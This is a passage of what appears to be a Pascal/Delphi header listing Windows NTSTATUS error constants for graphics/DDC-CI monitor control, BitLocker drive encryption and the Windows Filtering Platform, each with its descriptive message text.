// MessageId: STATUS_GRAPHICS_I2C_ERROR_RECEIVING_DATA
//
// MessageText:
//
// An error occurred while receiving data from the device on the I2C bus.
//
STATUS_GRAPHICS_I2C_ERROR_RECEIVING_DATA = NTSTATUS($C01E0583);

//
// MessageId: STATUS_GRAPHICS_DDCCI_VCP_NOT_SUPPORTED
//
// MessageText:
//
// The monitor does not support the specified VCP code.
//
STATUS_GRAPHICS_DDCCI_VCP_NOT_SUPPORTED = NTSTATUS($C01E0584);

//
// MessageId: STATUS_GRAPHICS_DDCCI_INVALID_DATA
//
// MessageText:
//
// The data received from the monitor is invalid.
//
STATUS_GRAPHICS_DDCCI_INVALID_DATA = NTSTATUS($C01E0585);

//
// MessageId: STATUS_GRAPHICS_DDCCI_MONITOR_RETURNED_INVALID_TIMING_STATUS_BYTE
//
// MessageText:
//
// The function failed because a monitor returned an invalid Timing Status byte when the operating system used the DDC/CI Get Timing Report & Timing Message command to get a timing report from a monitor.
//
STATUS_GRAPHICS_DDCCI_MONITOR_RETURNED_INVALID_TIMING_STATUS_BYTE = NTSTATUS($C01E0586);

//
// MessageId: STATUS_GRAPHICS_DDCCI_INVALID_CAPABILITIES_STRING
//
// MessageText:
//
// A monitor returned a DDC/CI capabilities string which did not comply with the ACCESS.bus 3.0, DDC/CI 1.1, or MCCS 2 Revision 1 specification.
//
STATUS_GRAPHICS_DDCCI_INVALID_CAPABILITIES_STRING = NTSTATUS($C01E0587);

//
// MessageId: STATUS_GRAPHICS_MCA_INTERNAL_ERROR
//
// MessageText:
//
// An internal error caused an operation to fail.
//
STATUS_GRAPHICS_MCA_INTERNAL_ERROR = NTSTATUS($C01E0588);

//
// MessageId: STATUS_GRAPHICS_DDCCI_INVALID_MESSAGE_COMMAND
//
// MessageText:
//
// An operation failed because a DDC/CI message had an invalid value in its command field.
//
STATUS_GRAPHICS_DDCCI_INVALID_MESSAGE_COMMAND = NTSTATUS($C01E0589);

//
// MessageId: STATUS_GRAPHICS_DDCCI_INVALID_MESSAGE_LENGTH
//
// MessageText:
//
// An error occurred because the field length of a DDC/CI message contained an invalid value.
//
STATUS_GRAPHICS_DDCCI_INVALID_MESSAGE_LENGTH = NTSTATUS($C01E058A);

//
// MessageId: STATUS_GRAPHICS_DDCCI_INVALID_MESSAGE_CHECKSUM
//
// MessageText:
//
// An error occurred because the checksum field in a DDC/CI message did not match the message's computed checksum value. This error implies that the data was corrupted while it was being transmitted from a monitor to a computer.
//
STATUS_GRAPHICS_DDCCI_INVALID_MESSAGE_CHECKSUM = NTSTATUS($C01E058B);

//
// MessageId: STATUS_GRAPHICS_INVALID_PHYSICAL_MONITOR_HANDLE
//
// MessageText:
//
// This function failed because an invalid monitor handle was passed to it.
//
STATUS_GRAPHICS_INVALID_PHYSICAL_MONITOR_HANDLE = NTSTATUS($C01E058C);

//
// MessageId: STATUS_GRAPHICS_MONITOR_NO_LONGER_EXISTS
//
// MessageText:
//
// The operating system asynchronously destroyed the monitor which corresponds to this handle because the operating system's state changed. This error typically occurs because the monitor PDO associated with this handle was removed, the monitor PDO associated with this handle was stopped, or a display mode change occurred. A display mode change occurs when windows sends a WM_DISPLAYCHANGE windows message to applications.
//
STATUS_GRAPHICS_MONITOR_NO_LONGER_EXISTS = NTSTATUS($C01E058D);

//
//   OPM, UAB, PVP and DDC/CI shared status codes {0x25E0..0x25FF}
//
//
// MessageId: STATUS_GRAPHICS_ONLY_CONSOLE_SESSION_SUPPORTED
//
// MessageText:
//
// This function can only be used if a program is running in the local console session. It cannot be used if a program is running on a remote desktop session or on a terminal server session.
//
STATUS_GRAPHICS_ONLY_CONSOLE_SESSION_SUPPORTED = NTSTATUS($C01E05E0);

//
// MessageId: STATUS_GRAPHICS_NO_DISPLAY_DEVICE_CORRESPONDS_TO_NAME
//
// MessageText:
//
// This function cannot find an actual GDI display device which corresponds to the specified GDI display device name.
//
STATUS_GRAPHICS_NO_DISPLAY_DEVICE_CORRESPONDS_TO_NAME = NTSTATUS($C01E05E1);

//
// MessageId: STATUS_GRAPHICS_DISPLAY_DEVICE_NOT_ATTACHED_TO_DESKTOP
//
// MessageText:
//
// The function failed because the specified GDI display device was not attached to the Windows desktop.
//
STATUS_GRAPHICS_DISPLAY_DEVICE_NOT_ATTACHED_TO_DESKTOP = NTSTATUS($C01E05E2);

//
// MessageId: STATUS_GRAPHICS_MIRRORING_DEVICES_NOT_SUPPORTED
//
// MessageText:
//
// This function does not support GDI mirroring display devices because GDI mirroring display devices do not have any physical monitors associated with them.
//
STATUS_GRAPHICS_MIRRORING_DEVICES_NOT_SUPPORTED = NTSTATUS($C01E05E3);

//
// MessageId: STATUS_GRAPHICS_INVALID_POINTER
//
// MessageText:
//
// The function failed because an invalid pointer parameter was passed to it. A pointer parameter is invalid if it is NULL, it points to an invalid address, it points to a kernel mode address or it is not correctly aligned.
//
STATUS_GRAPHICS_INVALID_POINTER  = NTSTATUS($C01E05E4);

//
// MessageId: STATUS_GRAPHICS_NO_MONITORS_CORRESPOND_TO_DISPLAY_DEVICE
//
// MessageText:
//
// This function failed because the GDI device passed to it did not have any monitors associated with it.
//
STATUS_GRAPHICS_NO_MONITORS_CORRESPOND_TO_DISPLAY_DEVICE = NTSTATUS($C01E05E5);

//
// MessageId: STATUS_GRAPHICS_PARAMETER_ARRAY_TOO_SMALL
//
// MessageText:
//
// An array passed to the function cannot hold all of the data that the function must copy into the array.
//
STATUS_GRAPHICS_PARAMETER_ARRAY_TOO_SMALL = NTSTATUS($C01E05E6);

//
// MessageId: STATUS_GRAPHICS_INTERNAL_ERROR
//
// MessageText:
//
// An internal error caused an operation to fail.
//
STATUS_GRAPHICS_INTERNAL_ERROR   = NTSTATUS($C01E05E7);

//
// MessageId: STATUS_GRAPHICS_SESSION_TYPE_CHANGE_IN_PROGRESS
//
// MessageText:
//
// The function failed because the current session is changing its type. This function cannot be called when the current session is changing its type. There are currently three types of sessions: console, disconnected and remote.
//
STATUS_GRAPHICS_SESSION_TYPE_CHANGE_IN_PROGRESS = NTSTATUS($C01E05E8);


//
// Full Volume Encryption Error codes (fvevol.sys)
//

//
// MessageId: STATUS_FVE_LOCKED_VOLUME
//
// MessageText:
//
// This volume is locked by BitLocker Drive Encryption.
//
STATUS_FVE_LOCKED_VOLUME         = NTSTATUS($C0210000);

//
// MessageId: STATUS_FVE_NOT_ENCRYPTED
//
// MessageText:
//
// The volume is not encrypted, no key is available.
//
STATUS_FVE_NOT_ENCRYPTED         = NTSTATUS($C0210001);

//
// MessageId: STATUS_FVE_BAD_INFORMATION
//
// MessageText:
//
// The control block for the encrypted volume is not valid.
//
STATUS_FVE_BAD_INFORMATION       = NTSTATUS($C0210002);

//
// MessageId: STATUS_FVE_TOO_SMALL
//
// MessageText:
//
// The volume cannot be encrypted because it does not have enough free space.
//
STATUS_FVE_TOO_SMALL             = NTSTATUS($C0210003);

//
// MessageId: STATUS_FVE_FAILED_WRONG_FS
//
// MessageText:
//
// The volume cannot be encrypted because the file system is not supported.
//
STATUS_FVE_FAILED_WRONG_FS       = NTSTATUS($C0210004);

//
// MessageId: STATUS_FVE_BAD_PARTITION_SIZE
//
// MessageText:
//
// The file system size is larger than the partition size in the partition table.
//
STATUS_FVE_BAD_PARTITION_SIZE    = NTSTATUS($C0210005);

//
// MessageId: STATUS_FVE_FS_NOT_EXTENDED
//
// MessageText:
//
// The file system does not extend to the end of the volume.
//
STATUS_FVE_FS_NOT_EXTENDED       = NTSTATUS($C0210006);

//
// MessageId: STATUS_FVE_FS_MOUNTED
//
// MessageText:
//
// This operation cannot be performed while a file system is mounted on the volume.
//
STATUS_FVE_FS_MOUNTED            = NTSTATUS($C0210007);

//
// MessageId: STATUS_FVE_NO_LICENSE
//
// MessageText:
//
// BitLocker Drive Encryption is not included with this version of Windows.
//
STATUS_FVE_NO_LICENSE            = NTSTATUS($C0210008);

//
// MessageId: STATUS_FVE_ACTION_NOT_ALLOWED
//
// MessageText:
//
// Requested action not allowed in the current volume state.
//
STATUS_FVE_ACTION_NOT_ALLOWED    = NTSTATUS($C0210009);

//
// MessageId: STATUS_FVE_BAD_DATA
//
// MessageText:
//
// Data supplied is malformed.
//
STATUS_FVE_BAD_DATA              = NTSTATUS($C021000A);

//
// MessageId: STATUS_FVE_VOLUME_NOT_BOUND
//
// MessageText:
//
// The volume is not bound to the system.
//
STATUS_FVE_VOLUME_NOT_BOUND      = NTSTATUS($C021000B);

//
// MessageId: STATUS_FVE_NOT_DATA_VOLUME
//
// MessageText:
//
// That volume is not a data volume.
//
STATUS_FVE_NOT_DATA_VOLUME       = NTSTATUS($C021000C);

//
// MessageId: STATUS_FVE_CONV_READ_ERROR
//
// MessageText:
//
// A read operation failed while converting the volume.
//
STATUS_FVE_CONV_READ_ERROR       = NTSTATUS($C021000D);

//
// MessageId: STATUS_FVE_CONV_WRITE_ERROR
//
// MessageText:
//
// A write operation failed while converting the volume.
//
STATUS_FVE_CONV_WRITE_ERROR      = NTSTATUS($C021000E);

//
// MessageId: STATUS_FVE_OVERLAPPED_UPDATE
//
// MessageText:
//
// The control block for the encrypted volume was updated by another thread. Try again.
//
STATUS_FVE_OVERLAPPED_UPDATE     = NTSTATUS($C021000F);

//
// MessageId: STATUS_FVE_FAILED_SECTOR_SIZE
//
// MessageText:
//
// The encryption algorithm does not support the sector size of that volume.
//
STATUS_FVE_FAILED_SECTOR_SIZE    = NTSTATUS($C0210010);

//
// MessageId: STATUS_FVE_FAILED_AUTHENTICATION
//
// MessageText:
//
// BitLocker recovery authentication failed.
//
STATUS_FVE_FAILED_AUTHENTICATION = NTSTATUS($C0210011);

//
// MessageId: STATUS_FVE_NOT_OS_VOLUME
//
// MessageText:
//
// That volume is not the OS volume.
//
STATUS_FVE_NOT_OS_VOLUME         = NTSTATUS($C0210012);

//
// MessageId: STATUS_FVE_KEYFILE_NOT_FOUND
//
// MessageText:
//
// The BitLocker startup key or recovery password could not be read from external media.
//
STATUS_FVE_KEYFILE_NOT_FOUND     = NTSTATUS($C0210013);

//
// MessageId: STATUS_FVE_KEYFILE_INVALID
//
// MessageText:
//
// The BitLocker startup key or recovery password file is corrupt or invalid.
//
STATUS_FVE_KEYFILE_INVALID       = NTSTATUS($C0210014);

//
// MessageId: STATUS_FVE_KEYFILE_NO_VMK
//
// MessageText:
//
// The BitLocker encryption key could not be obtained from the startup key or recovery password.
//
STATUS_FVE_KEYFILE_NO_VMK        = NTSTATUS($C0210015);

//
// MessageId: STATUS_FVE_TPM_DISABLED
//
// MessageText:
//
// The Trusted Platform Module (TPM) is disabled.
//
STATUS_FVE_TPM_DISABLED          = NTSTATUS($C0210016);

//
// MessageId: STATUS_FVE_TPM_SRK_AUTH_NOT_ZERO
//
// MessageText:
//
// The authorization data for the Storage Root Key (SRK) of the Trusted Platform Module (TPM) is not zero.
//
STATUS_FVE_TPM_SRK_AUTH_NOT_ZERO = NTSTATUS($C0210017);

//
// MessageId: STATUS_FVE_TPM_INVALID_PCR
//
// MessageText:
//
// The system boot information changed or the Trusted Platform Module (TPM) locked out access to BitLocker encryption keys until the computer is restarted.
//
STATUS_FVE_TPM_INVALID_PCR       = NTSTATUS($C0210018);

//
// MessageId: STATUS_FVE_TPM_NO_VMK
//
// MessageText:
//
// The BitLocker encryption key could not be obtained from the Trusted Platform Module (TPM).
//
STATUS_FVE_TPM_NO_VMK            = NTSTATUS($C0210019);

//
// MessageId: STATUS_FVE_PIN_INVALID
//
// MessageText:
//
// The BitLocker encryption key could not be obtained from the Trusted Platform Module (TPM) and PIN.
//
STATUS_FVE_PIN_INVALID           = NTSTATUS($C021001A);

//
// MessageId: STATUS_FVE_AUTH_INVALID_APPLICATION
//
// MessageText:
//
// A boot application hash does not match the hash computed when BitLocker was turned on.
//
STATUS_FVE_AUTH_INVALID_APPLICATION = NTSTATUS($C021001B);

//
// MessageId: STATUS_FVE_AUTH_INVALID_CONFIG
//
// MessageText:
//
// The Boot Configuration Data (BCD) settings are not supported or have changed since BitLocker was enabled.
//
STATUS_FVE_AUTH_INVALID_CONFIG   = NTSTATUS($C021001C);

//
// MessageId: STATUS_FVE_DEBUGGER_ENABLED
//
// MessageText:
//
// Boot debugging is enabled. Run bcdedit to turn it off.
//
STATUS_FVE_DEBUGGER_ENABLED      = NTSTATUS($C021001D);

//
// MessageId: STATUS_FVE_DRY_RUN_FAILED
//
// MessageText:
//
// The BitLocker encryption key could not be obtained.
//
STATUS_FVE_DRY_RUN_FAILED        = NTSTATUS($C021001E);

//
// MessageId: STATUS_FVE_BAD_METADATA_POINTER
//
// MessageText:
//
// The metadata disk region pointer is incorrect.
//
STATUS_FVE_BAD_METADATA_POINTER  = NTSTATUS($C021001F);

//
// MessageId: STATUS_FVE_OLD_METADATA_COPY
//
// MessageText:
//
// The backup copy of the metadata is out of date.
//
STATUS_FVE_OLD_METADATA_COPY     = NTSTATUS($C0210020);

//
// MessageId: STATUS_FVE_REBOOT_REQUIRED
//
// MessageText:
//
// No action was taken as a system reboot is required.
//
STATUS_FVE_REBOOT_REQUIRED       = NTSTATUS($C0210021);

//
// MessageId: STATUS_FVE_RAW_ACCESS
//
// MessageText:
//
// No action was taken as BitLocker Drive Encryption is in RAW access mode.
//
STATUS_FVE_RAW_ACCESS            = NTSTATUS($C0210022);

//
// MessageId: STATUS_FVE_RAW_BLOCKED
//
// MessageText:
//
// BitLocker Drive Encryption cannot enter raw access mode for this volume.
//
STATUS_FVE_RAW_BLOCKED           = NTSTATUS($C0210023);

//
// MessageId: STATUS_FVE_NO_AUTOUNLOCK_MASTER_KEY
//
// MessageText:
//
// The auto-unlock master key was not available from the operating system volume. Retry the operation using the BitLocker WMI interface.
//
STATUS_FVE_NO_AUTOUNLOCK_MASTER_KEY = NTSTATUS($C0210024);

//
// MessageId: STATUS_FVE_MOR_FAILED
//
// MessageText:
//
// The system firmware failed to enable clearing of system memory on reboot.
//
STATUS_FVE_MOR_FAILED            = NTSTATUS($C0210025);

//
// MessageId: STATUS_FVE_NO_FEATURE_LICENSE
//
// MessageText:
//
// This feature of BitLocker Drive Encryption is not included with this version of Windows.
//
STATUS_FVE_NO_FEATURE_LICENSE    = NTSTATUS($C0210026);

//
// MessageId: STATUS_FVE_POLICY_USER_DISABLE_RDV_NOT_ALLOWED
//
// MessageText:
//
// Group policy does not permit turning off BitLocker Drive Encryption on roaming data volumes.
//
STATUS_FVE_POLICY_USER_DISABLE_RDV_NOT_ALLOWED = NTSTATUS($C0210027);

//
// MessageId: STATUS_FVE_CONV_RECOVERY_FAILED
//
// MessageText:
//
// Bitlocker Drive Encryption failed to recover from aborted conversion. This could be due to either all conversion logs being corrupted or the media being write-protected.
//
STATUS_FVE_CONV_RECOVERY_FAILED  = NTSTATUS($C0210028);

//
// MessageId: STATUS_FVE_VIRTUALIZED_SPACE_TOO_BIG
//
// MessageText:
//
// The requested virtualization size is too big.
//
STATUS_FVE_VIRTUALIZED_SPACE_TOO_BIG = NTSTATUS($C0210029);

//
// MessageId: STATUS_FVE_INVALID_DATUM_TYPE
//
// MessageText:
//
// The management information stored on the drive contained an unknown type. If you are using an old version of Windows, try accessing the drive from the latest version.
//
STATUS_FVE_INVALID_DATUM_TYPE    = NTSTATUS($C021002A);

//
// MessageId: STATUS_FVE_VOLUME_TOO_SMALL
//
// MessageText:
//
// The drive is too small to be protected using BitLocker Drive Encryption.
//
STATUS_FVE_VOLUME_TOO_SMALL      = NTSTATUS($C0210030);

//
// MessageId: STATUS_FVE_ENH_PIN_INVALID
//
// MessageText:
//
// The BitLocker encryption key could not be obtained from the Trusted Platform Module (TPM) and enhanced PIN. Try using a PIN containing only numerals.
//
STATUS_FVE_ENH_PIN_INVALID       = NTSTATUS($C0210031);

//
// MessageId: STATUS_FVE_FULL_ENCRYPTION_NOT_ALLOWED_ON_TP_STORAGE
//
// MessageText:
//
// BitLocker Drive Encryption only supports Used Space Only encryption on thin provisioned storage.
//
STATUS_FVE_FULL_ENCRYPTION_NOT_ALLOWED_ON_TP_STORAGE = NTSTATUS($C0210032);

//
// MessageId: STATUS_FVE_WIPE_NOT_ALLOWED_ON_TP_STORAGE
//
// MessageText:
//
// BitLocker Drive Encryption does not support wiping free space on thin provisioned storage.
//
STATUS_FVE_WIPE_NOT_ALLOWED_ON_TP_STORAGE = NTSTATUS($C0210033);

//
// MessageId: STATUS_FVE_NOT_ALLOWED_ON_CSV_STACK
//
// MessageText:
//
// This command can only be performed from the coordinator node for the specified CSV volume.
//
STATUS_FVE_NOT_ALLOWED_ON_CSV_STACK = NTSTATUS($C0210034);

//
// MessageId: STATUS_FVE_NOT_ALLOWED_ON_CLUSTER
//
// MessageText:
//
// This command cannot be performed on a volume when it is part of a cluster.
//
STATUS_FVE_NOT_ALLOWED_ON_CLUSTER = NTSTATUS($C0210035);

//
// MessageId: STATUS_FVE_NOT_ALLOWED_TO_UPGRADE_WHILE_CONVERTING
//
// MessageText:
//
// BitLocker cannot be upgraded during disk encryption or decryption.
//
STATUS_FVE_NOT_ALLOWED_TO_UPGRADE_WHILE_CONVERTING = NTSTATUS($C0210036);

//
// MessageId: STATUS_FVE_WIPE_CANCEL_NOT_APPLICABLE
//
// MessageText:
//
// Wipe of free space is not currently taking place.
//
STATUS_FVE_WIPE_CANCEL_NOT_APPLICABLE = NTSTATUS($C0210037);

//
// MessageId: STATUS_FVE_EDRIVE_DRY_RUN_FAILED
//
// MessageText:
//
// Your computer doesn't support BitLocker hardware-based encryption. Check with your computer manufacturer for firmware updates.
//
STATUS_FVE_EDRIVE_DRY_RUN_FAILED = NTSTATUS($C0210038);

//
// MessageId: STATUS_FVE_SECUREBOOT_DISABLED
//
// MessageText:
//
// Secure Boot has been disabled. Either Secure Boot must be re-enabled, or BitLocker must be suspended for Windows to start normally.
//
STATUS_FVE_SECUREBOOT_DISABLED   = NTSTATUS($C0210039);

//
// MessageId: STATUS_FVE_SECUREBOOT_CONFIG_CHANGE
//
// MessageText:
//
// Secure Boot policy has unexpectedly changed.
//
STATUS_FVE_SECUREBOOT_CONFIG_CHANGE = NTSTATUS($C021003A);

//
// MessageId: STATUS_FVE_DEVICE_LOCKEDOUT
//
// MessageText:
//
// Device Lock has been triggered due to too many incorrect password attempts.
//
STATUS_FVE_DEVICE_LOCKEDOUT      = NTSTATUS($C021003B);

//
// MessageId: STATUS_FVE_VOLUME_EXTEND_PREVENTS_EOW_DECRYPT
//
// MessageText:
//
// Device encryption removal is blocked due to volume being extended beyond its original size.
//
STATUS_FVE_VOLUME_EXTEND_PREVENTS_EOW_DECRYPT = NTSTATUS($C021003C);

//
// MessageId: STATUS_FVE_NOT_DE_VOLUME
//
// MessageText:
//
// This action isn't supported because this drive isn't automatically managed with device encryption.
//
STATUS_FVE_NOT_DE_VOLUME         = NTSTATUS($C021003D);

//
// MessageId: STATUS_FVE_PROTECTION_DISABLED
//
// MessageText:
//
// BitLocker Drive Encryption has been suspended on this drive. All BitLocker key protectors configured for this drive are effectively disabled, and the drive will be automatically unlocked using an unencrypted (clear) key.
//
STATUS_FVE_PROTECTION_DISABLED   = NTSTATUS($C021003E);

//
// MessageId: STATUS_FVE_PROTECTION_CANNOT_BE_DISABLED
//
// MessageText:
//
// BitLocker can't be suspended on this drive until the next restart.
//
STATUS_FVE_PROTECTION_CANNOT_BE_DISABLED = NTSTATUS($C021003F);

//
// MessageId: STATUS_FVE_OSV_KSR_NOT_ALLOWED
//
// MessageText:
//
// BitLocker Drive Encryption policy does not allow KSR operation with protected OS volume.
//
STATUS_FVE_OSV_KSR_NOT_ALLOWED   = NTSTATUS($C0210040);


//
// FWP error codes (fwpkclnt.sys)
//

//
// MessageId: STATUS_FWP_CALLOUT_NOT_FOUND
//
// MessageText:
//
// The callout does not exist.
//
STATUS_FWP_CALLOUT_NOT_FOUND     = NTSTATUS($C0220001);

//
// MessageId: STATUS_FWP_CONDITION_NOT_FOUND
//
// MessageText:
//
// The filter condition does not exist.
//
STATUS_FWP_CONDITION_NOT_FOUND   = NTSTATUS($C0220002);

//
// MessageId: STATUS_FWP_FILTER_NOT_FOUND
//
// MessageText:
//
// The filter does not exist.
//
STATUS_FWP_FILTER_NOT_FOUND      = NTSTATUS($C0220003);

//
// MessageId: STATUS_FWP_LAYER_NOT_FOUND
//
// MessageText:
//
// The layer does not exist.
//
STATUS_FWP_LAYER_NOT_FOUND       = NTSTATUS($C0220004);

//
// MessageId: STATUS_FWP_PROVIDER_NOT_FOUND
//
// MessageText:
//
// The provider does not exist.
//
STATUS_FWP_PROVIDER_NOT_FOUND    = NTSTATUS($C0220005);

//
// MessageId: STATUS_FWP_PROVIDER_CONTEXT_NOT_FOUND
//
// MessageText:
//
// The provider context does not exist.
//
STATUS_FWP_PROVIDER_CONTEXT_NOT_FOUND = NTSTATUS($C0220006);

//
// MessageId: STATUS_FWP_SUBLAYER_NOT_FOUND
//
// MessageText:
//
// The sublayer does not exist.
//
STATUS_FWP_SUBLAYER_NOT_FOUND    = NTSTATUS($C0220007);

//
// MessageId: STATUS_FWP_NOT_FOUND
//
// MessageText:
//
// The object does not exist.
//
STATUS_FWP_NOT_FOUND             = NTSTATUS($C0220008);

//
// MessageId: STATUS_FWP_ALREADY_EXISTS
//
// MessageText:
//
// An object with that GUID or LUID already exists.
//
STATUS_FWP_ALREADY_EXISTS        = NTSTATUS($C0220009);

//
// MessageId: STATUS_FWP_IN_USE
//
// MessageText:
//
// The object is referenced by other objects so cannot be deleted.
//
STATUS_FWP_IN_USE                = NTSTATUS($C022000A);

//
// MessageId: STATUS_FWP_DYNAMIC_SESSION_IN_PROGRESS
//
// MessageText:
//
// The call is not allowed from within a dynamic session.
//
STATUS_FWP_DYNAMIC_SESSION_IN_PROGRESS = NTSTATUS($C022000B);

//
// MessageId: STATUS_FWP_WRONG_SESSION
//
// MessageText:
//
// The call was made from the wrong session so cannot be completed.
//
STATUS_FWP_WRONG_SESSION         = NTSTATUS($C022000C);

//
// MessageId: STATUS_FWP_NO_TXN_IN_PROGRESS
//
// MessageText:
//
// The call must be made from within an explicit transaction.
//
STATUS_FWP_NO_TXN_IN_PROGRESS    = NTSTATUS($C022000D);

//
// MessageId: STATUS_FWP_TXN_IN_PROGRESS
//
// MessageText:
//
// The call is not allowed from within an explicit transaction.
//
STATUS_FWP_TXN_IN_PROGRESS       = NTSTATUS($C022000E);

//
// MessageId: STATUS_FWP_TXN_ABORTED
//
// MessageText:
//
// The explicit transaction has been forcibly cancelled.
//
STATUS_FWP_TXN_ABORTED           = NTSTATUS($C022000F);

//
// MessageId: STATUS_FWP_SESSION_ABORTED
//
// MessageText:
//
// The session has been cancelled.
//
STATUS_FWP_SESSION_ABORTED       = NTSTATUS($C0220010);

//
// MessageId: STATUS_FWP_INCOMPATIBLE_TXN
//
// MessageText:
//
// The call is not allowed from within a read-only transaction.
//
STATUS_FWP_INCOMPATIBLE_TXN      = NTSTATUS($C0220011);

//
// MessageId: STATUS_FWP_TIMEOUT
//
// MessageText:
//
// The call timed out while waiting to acquire the transaction lock.
//
STATUS_FWP_TIMEOUT               = NTSTATUS($C0220012);

//
// MessageId: STATUS_FWP_NET_EVENTS_DISABLED
//
// MessageText:
//
// Collection of network diagnostic events is disabled.
//
STATUS_FWP_NET_EVENTS_DISABLED   = NTSTATUS($C0220013);

//
// MessageId: STATUS_FWP_INCOMPATIBLE_LAYER
//
// MessageText:
//
// The operation is not supported by the specified layer.
//
STATUS_FWP_INCOMPATIBLE_LAYER    = NTSTATUS($C0220014);

//
// MessageId: STATUS_FWP_KM_CLIENTS_ONLY
//
// MessageText:
//
// The call is allowed for kernel-mode callers only.
//
STATUS_FWP_KM_CLIENTS_ONLY       = NTSTATUS($C0220015);

//
// MessageId: STATUS_FWP_LIFETIME_MISMATCH
//
// MessageText:
//
// The call tried to associate two objects with incompatible lifetimes.
//
STATUS_FWP_LIFETIME_MISMATCH     = NTSTATUS($C0220016);

//
// MessageId: STATUS_FWP_BUILTIN_OBJECT
//
// MessageText:
//
// The object is built in so cannot be deleted.
//
STATUS_FWP_BUILTIN_OBJECT        = NTSTATUS($C0220017);

//
// MessageId: STATUS_FWP_TOO_MANY_CALLOUTS
//
// MessageText:
//
// The maximum number of callouts has been reached.
//
STATUS_FWP_TOO_MANY_CALLOUTS     = NTSTATUS($C0220018);

//
// MessageId: STATUS_FWP_NOTIFICATION_DROPPED
//
// MessageText:
//
// A notification could not be delivered because a message queue is at its maximum capacity.
//
STATUS_FWP_NOTIFICATION_DROPPED  = NTSTATUS($C0220019);

//
// MessageId: STATUS_FWP_TRAFFIC_MISMATCH
//
// MessageText:
//
// The traffic parameters do not match those for the security association context.
//
STATUS_FWP_TRAFFIC_MISMATCH      = NTSTATUS($C022001A);

//
// MessageId: STATUS_FWP_INCOMPATIBLE_SA_STATE
//
// MessageText:
//
// The call is not allowed for the current security association state.
//
STATUS_FWP_INCOMPATIBLE_SA_STATE = NTSTATUS($C022001B);

//
// MessageId: STATUS_FWP_NULL_POINTER
//
// MessageText:
//
// A required pointer is null.
//
STATUS_FWP_NULL_POINTER          = NTSTATUS($C022001C);

//
// MessageId: STATUS_FWP_INVALID_ENUMERATOR
//
// MessageText:
//
// An enumerator is not valid.
//
STATUS_FWP_INVALID_ENUMERATOR    = NTSTATUS($C022001D);

//
// MessageId: STATUS_FWP_INVALID_FLAGS
//
// MessageText:
//
// The flags field contains an invalid value.
//
STATUS_FWP_INVALID_FLAGS         = NTSTATUS($C022001E);

//
// MessageId: STATUS_FWP_INVALID_NET_MASK
//
// MessageText:
//
// A network mask is not valid.
//
STATUS_FWP_INVALID_NET_MASK      = NTSTATUS($C022001F);

//
// MessageId: STATUS_FWP_INVALID_RANGE
//
// MessageText:
//
// An FWP_RANGE is not valid.
//
STATUS_FWP_INVALID_RANGE         = NTSTATUS($C0220020);

//
// MessageId: STATUS_FWP_INVALID_INTERVAL
//
// MessageText:
//
// The time interval is not valid.
//
STATUS_FWP_INVALID_INTERVAL      = NTSTATUS($C0220021);

//
// MessageId: STATUS_FWP_ZERO_LENGTH_ARRAY
//
// MessageText:
//
// An array that must contain at least one element is zero length.
//
STATUS_FWP_ZERO_LENGTH_ARRAY     = NTSTATUS($C0220022);

//
// MessageId: STATUS_FWP_NULL_DISPLAY_NAME
//
// MessageText:
//
// The displayData.name field cannot be null.
//
STATUS_FWP_NULL_DISPLAY_NAME     = NTSTATUS($C0220023);

//
// MessageId: STATUS_FWP_INVALID_ACTION_TYPE
//
// MessageText:
//
// The action type is not one of the allowed action types for a filter.
//
STATUS_FWP_INVALID_ACTION_TYPE   = NTSTATUS($C0220024);

//
// MessageId: STATUS_FWP_INVALID_WEIGHT
//
// MessageText:
//
// The filter weight is not valid.
//
STATUS_FWP_INVALID_WEIGHT        = NTSTATUS($C0220025);

//
// MessageId: STATUS_FWP_MATCH_TYPE_MISMATCH
//
// MessageText:
//
// A filter condition contains a match type that is not compatible with the operands.
//
STATUS_FWP_MATCH_TYPE_MISMATCH   = NTSTATUS($C0220026);

//
// MessageId: STATUS_FWP_TYPE_MISMATCH
//
// MessageText:
//
// An FWP_VALUE or FWPM_CONDITION_VALUE is of the wrong type.
//
STATUS_FWP_TYPE_MISMATCH         = NTSTATUS($C0220027);

//
// MessageId: STATUS_FWP_OUT_OF_BOUNDS
//
// MessageText:
//
// An integer value is outside the allowed range.
//
STATUS_FWP_OUT_OF_BOUNDS         = NTSTATUS($C0220028);

//
// MessageId: STATUS_FWP_RESERVED
//
// MessageText:
//
// A reserved field is non-zero.
//
STATUS_FWP_RESERVED              = NTSTATUS($C0220029);

//
// MessageId: STATUS_FWP_DUPLICATE_CONDITION
//
// MessageText:
//
// A filter cannot contain multiple conditions operating on a single field.
//
STATUS_FWP_DUPLICATE_CONDITION   = NTSTATUS($C022002A);

//
// MessageId: STATUS_FWP_DUPLICATE_KEYMOD
//
// MessageText:
//
// A policy cannot contain the same keying module more than once.
//
STATUS_FWP_DUPLICATE_KEYMOD      = NTSTATUS($C022002B);

//
// MessageId: STATUS_FWP_ACTION_INCOMPATIBLE_WITH_LAYER
//
// MessageText:
//
// The action type is not compatible with the layer.
//
STATUS_FWP_ACTION_INCOMPATIBLE_WITH_LAYER = NTSTATUS($C022002C);

//
// MessageId: STATUS_FWP_ACTION_INCOMPATIBLE_WITH_SUBLAYER
//
// MessageText:
//
// The action type is not compatible with the sublayer.
//
STATUS_FWP_ACTION_INCOMPATIBLE_WITH_SUBLAYER = NTSTATUS($C022002D);

//
// MessageId: STATUS_FWP_CONTEXT_INCOMPATIBLE_WITH_LAYER
//
// MessageText:
//
// The raw context or the provider context is not compatible with the layer.
//
STATUS_FWP_CONTEXT_INCOMPATIBLE_WITH_LAYER = NTSTATUS($C022002E);

//
// MessageId: STATUS_FWP_CONTEXT_INCOMPATIBLE_WITH_CALLOUT
//
// MessageText:
//
// The raw context or the provider context is not compatible with the callout.
//
STATUS_FWP_CONTEXT_INCOMPATIBLE_WITH_CALLOUT = NTSTATUS($C022002F);

//
// MessageId: STATUS_FWP_INCOMPATIBLE_AUTH_METHOD
//
// MessageText:
//
// The authentication method is not compatible with the policy type.
//
STATUS_FWP_INCOMPATIBLE_AUTH_METHOD = NTSTATUS($C0220030);

//
// MessageId: STATUS_FWP_INCOMPATIBLE_DH_GROUP
//
// MessageText:
//
// The Diffie-Hellman group is not compatible with the policy type.
//
STATUS_FWP_INCOMPATIBLE_DH_GROUP = NTSTATUS($C0220031);

//
// MessageId: STATUS_FWP_EM_NOT_SUPPORTED
//
// MessageText:
//
// An IKE policy cannot contain an Extended Mode policy.
//
STATUS_FWP_EM_NOT_SUPPORTED      = NTSTATUS($C0220032);

//
// MessageId: STATUS_FWP_NEVER_MATCH
//
// MessageText:
//
// The enumeration template or subscription will never match any objects.
//
